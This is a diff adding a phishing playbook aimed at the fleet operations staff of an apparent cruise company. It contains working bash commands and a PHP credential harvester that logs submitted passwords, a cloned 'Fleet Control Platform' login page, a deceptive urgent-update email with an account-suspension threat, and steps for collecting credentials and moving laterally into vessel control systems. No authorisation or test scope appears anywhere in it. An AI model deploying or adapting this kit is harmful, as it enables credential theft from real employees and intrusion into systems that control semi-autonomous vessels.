@@ -1,0 +1,98 @@
+# FLEET OPS PHISHING - RAPID EXECUTION
+## Target: HQ Fleet Operations Center Staff
+
+### **QUICK DEPLOYMENT**
+
+```bash
+# 1. SETUP INFRASTRUCTURE
+mkdir -p /tmp/fleet-ops && cd /tmp/fleet-ops
+sudo systemctl start apache2
+sudo systemctl enable apache2
+
+# 2. CREATE CREDENTIAL HARVESTER
+cat > /var/www/html/fleet-login.php << 'EOF'
+<?php
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $data = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $_POST['username'] . ":" . $_POST['password'] . "\n";
+    file_put_contents('/tmp/fleet_creds.txt', $data, FILE_APPEND);
+    header('Location: https://croissantcruises.com/fleet-control');
+    exit();
+}
+?>
+EOF
+
+# 3. CREATE FAKE LOGIN PAGE
+cat > /var/www/html/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head><title>Fleet Control Platform - Security Update</title></head>
+<body style="font-family:Arial;background:#f0f0f0;margin:0;padding:20px;">
+<div style="max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+<h2 style="color:#2c5aa0;text-align:center;">Fleet Control Platform</h2>
+<div style="background:#fff3cd;border:1px solid #ffeaa7;padding:10px;border-radius:4px;margin-bottom:20px;">
+<strong>Security Update Required:</strong> Enhanced authentication protocols now active.
+</div>
+<form method="POST" action="fleet-login.php">
+<input type="email" name="username" placeholder="Email Address" required style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:4px;">
+<input type="password" name="password" placeholder="Password" required style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:4px;">
+<button type="submit" style="width:100%;padding:12px;background:#2c5aa0;color:white;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
+</form>
+<p style="font-size:12px;color:#666;text-align:center;margin-top:20px;">Enhanced security for semi-autonomous vessel control systems</p>
+</div>
+</body>
+</html>
+EOF
+```
+
+### **EMAIL CAMPAIGN**
+
+**Subject:** `URGENT: Fleet Control Platform Security Update - Action Required by EOD`
+
+**Body:**
+```
+Dear Fleet Operations Team,
+
+Critical vulnerabilities detected in Fleet Control Platform requiring immediate patching. These vulnerabilities could allow unauthorized access to semi-autonomous vessel control systems.
+
+MANDATORY UPDATE: Complete security patch by 18:00 EST today.
+
+Access updated platform: http://YOUR-IP/fleet-login.php
+
+Update includes:
+- Enhanced authentication protocols
+- Improved encryption for vessel communications
+- Patched remote command vulnerabilities
+
+IMPORTANT: Operations suspended for accounts not updated by deadline.
+
+Cybersecurity Office
+All Ports Tours
+```
+
+### **DEPLOYMENT STEPS**
+
+```bash
+# 4. GET YOUR EXTERNAL IP
+curl -s ifconfig.me
+
+# 5. SEND EMAILS (use your preferred method)
+# Replace YOUR-IP with actual IP from step 4
+
+# 6. MONITOR CREDENTIALS
+tail -f /tmp/fleet_creds.txt
+```
+
+### **SUCCESS INDICATORS**
+- Credentials captured in `/tmp/fleet_creds.txt`
+- Time to first credential: Fast
+- No immediate security alerts
+
+### **POST-COMPROMISE**
+```bash
+# Test captured credentials against real fleet systems
+# Attempt lateral movement within HQ network
+# Document control channel security weaknesses
+```
+
+---
+**EXPECTED SUCCESS RATE: 40%+**
